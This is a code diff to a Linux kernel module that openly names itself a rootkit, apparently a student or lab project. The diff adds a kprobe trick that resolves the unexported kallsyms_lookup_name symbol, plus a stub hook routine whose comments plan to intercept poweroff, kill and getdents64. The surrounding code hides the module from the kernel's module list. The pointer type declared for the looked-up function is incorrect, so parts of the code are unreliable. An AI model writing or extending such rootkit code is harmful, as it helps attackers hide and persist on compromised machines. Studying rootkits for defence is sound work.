@@ -8,6 +8,7 @@
 #include <linux/fs.h>
 #include <linux/uaccess.h>
 #include <linux/cdev.h>
+#include <linux/kprobes.h>
 #include <asm/syscall.h>
 
 #include "rootkit.h"
@@ -21,6 +22,7 @@ MODULE_VERSION("0.1");
 
 static int major;
 struct cdev *kernel_cdev;
+static int (*kallsyms_lookup_name_ptr)(unsigned long);
 static struct list_head *modules_head;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
@@ -33,6 +35,17 @@ static int rootkit_release(struct inode *inode, struct file *filp)
 {
 	pr_info("%s\n", __func__);
 	return 0;
+}
+
+static int module_hook(unsigned long arg)
+{
+	// NOTE: hook poweroff: kernel/reboot.c
+	// NOTE: hook kill: kernel/signal.c: kill
+	// NOTE: hook getdents64
+	int ret = 0;
+
+	
+	return ret;
 }
 
 static int masq_module(unsigned long arg)
@@ -95,8 +108,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
 	switch (ioctl) {
 	case IOCTL_MOD_HOOK:
-		// hook poweroff: kernel/reboot.c
-		// hook kill: kernel/signal.c: kill
+		module_hook(arg);
 		break;
 	case IOCTL_MOD_HIDE:
 		if (THIS_MODULE->list.next || THIS_MODULE->list.prev) {
@@ -127,6 +139,7 @@ static int __init rootkit_init(void)
 {
 	int ret;
 	dev_t dev_no, dev;
+	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
 
 	kernel_cdev = cdev_alloc();
 	kernel_cdev->ops = &fops;
@@ -148,6 +161,9 @@ static int __init rootkit_init(void)
 	}
 
 	modules_head = THIS_MODULE->list.prev;
+	register_kprobe(&kp);
+	kallsyms_lookup_name_ptr = (int (*)(unsigned long)) kp.addr;
+	unregister_kprobe(&kp);
 
 	return 0;
 }
